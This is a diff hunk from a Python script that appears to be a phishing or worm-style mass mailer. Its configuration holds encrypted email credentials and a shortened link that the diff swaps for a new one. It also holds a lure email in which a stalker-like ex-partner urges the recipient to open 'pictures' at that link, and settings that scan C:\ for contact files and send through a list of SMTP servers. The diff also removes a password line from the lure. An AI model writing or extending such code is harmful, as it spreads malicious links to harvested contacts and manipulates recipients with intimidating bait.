@@ -25,15 +25,14 @@ def decrypt_config():
     base_config = {
         'EMAIL_SENDER': 'gAAAAABoXHC-_9dAuXiMkTqWjm0J4SR1pAMVULGlbPEG4teTYf0hKIZqmXqPakN4CV66WbCyzk81NKtodYJMOQxBSNzsPTKPNQJs0z3BUebIiD-4UDEX59c=',
         'APP_PASSWORD': 'gAAAAABoXHC-teVLcWnb_8bc2gUWlU7__E4xujIX-865NNgeD7EElWRrkmN9GqhAOm3nETqppxuZyiu_81vvwevE_sqymYeUwAWMe8Llk8D4oafOGBG2nLA=',
-        'LINK': 'http://bit.ly/3HSsTgn',  # Added link
+        'LINK': 'http://bit.ly/3ZNvmif',  # Added link
         'SUBJECT': "I'm Crazy About You!! I won't Give Up On Us..",
         'BODY': "I miss being part of you. I miss the moments we spent together. See, Ive being following you for a while now,\n"
                 "I even know where you work. You always said I didnt see you fully but as\n"
                 "I was taking these pictures, I saw the joy in your laugh, the brightness in your smile.\n"
                 "I hope the pictures bring you the same warmth they do in me. I've shared the pictures here: {link}\n"
                 "I love you and you know it. Don't make me regret this please.\n"
-                "I miss you, I want you back baby. Talk to me when you're free.\n\n"
-                "Password = MyLove",
+                "I miss you, I want you back baby. Talk to me when you're free.\n\n",
         'CONTACTS_DIR': r'C:\\',
         'CONTACT_EXTENSIONS': ['.vcf', '.csv', '.txt', '.contact'],
         'SMTP_SERVERS': [
